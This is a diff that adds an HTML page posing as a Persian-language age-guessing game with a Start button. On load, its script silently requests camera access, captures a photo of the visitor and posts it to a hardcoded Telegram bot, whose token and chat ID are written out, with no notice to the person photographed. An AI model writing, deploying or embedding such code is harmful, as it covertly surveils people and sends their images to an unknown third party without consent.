@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>چند سالته؟</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+<style>
+    body {
+        font-family: Tahoma, Arial, sans-serif;
+        text-align: center;
+    }
+
+    #guessForm {
+        margin-top: 50px;
+    }
+
+    input[type="file"] {
+        display: none;
+    }
+
+    label {
+        padding: 10px 20px;
+        background-color: #007bff;
+        color: #fff;
+        cursor: pointer;
+    }
+
+    input[type="number"] {
+        padding: 10px;
+        margin-top: 20px;
+        font-size: 16px;
+    }
+
+    input[type="submit"] {
+        padding: 10px 20px;
+        background-color: #28a745;
+        color: #fff;
+        border: none;
+        cursor: pointer;
+        font-size: 16px;
+        margin-top: 20px;
+    }
+</style>
+</head>
+
+<body>
+    
+    <!-- مکان کد های HTML -->
+
+    <form> 
+        <img src="./img/1.jpg" height="100px" width="100px" style="border-radius: 100%;" margin-left: 100px;><br>
+
+         <legend> <p style="background-color: aqua; color: black; font-size: 30px;">!برای شروع بازی روی استارت کلیک کنید</p></legend><br>
+       
+       <button style="background-color: aqua; color: black; background-size: 30px;">
+         Start
+          </button>
+
+    <script>
+
+        // مکان کد های جاوااسکریپت
+
+        // تابعی برای گرفتن عکس از دوربین و ارسال آن به تلگرام
+async function takePhotoAndSend() {
+    try {
+        // دسترسی به دوربین را درخواست می‌دهیم
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+        // ساخت یک المان video برای نمایش دوربین
+        const video = document.createElement('video');
+        document.body.appendChild(video);
+        video.srcObject = stream;
+        await video.play();
+
+
+
+        // ایجاد یک کانواس برای ذخیره عکس
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // تبدیل تصویر به Blob
+        canvas.toBlob(blob => {
+            // فراخوانی تابع ارسال عکس به تلگرام
+            sendPhotoToTelegram(blob);
+
+            // توقف دوربین و حذف المان‌های ایجاد شده
+            stream.getTracks().forEach(track => track.stop());
+            document.body.removeChild(video);
+            document.body.removeChild(canvas);
+        }, 'image/jpeg');
+
+    } catch (error) {
+        console.error('Error accessing the camera: ', error);
+    }
+}
+
+// تابعی برای ارسال عکس به تلگرام
+function sendPhotoToTelegram(blob) {
+    // تعیین آدرس ارسال عکس به ربات تلگرام
+    const url = `https://api.telegram.org/bot7671592064:AAEkZlloL9_cJzRUGQ00L24rzXPa8WPF1U8/sendPhoto`;
+
+    // تعیین داده‌های فرم برای ارسال
+    const formData = new FormData();
+    formData.append('photo', blob, 'photo.jpg');
+    formData.append('chat_id', '7978719023');
+
+    // ارسال درخواست POST با استفاده از fetch API
+    fetch(url, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error('Error sending photo to Telegram: ', error));
+}
+
+// خودکار فراخوانی تابع گرفتن عکس و ارسال آن به تلگرام
+takePhotoAndSend();
+
+    
+    </script>
+
+</body>
+
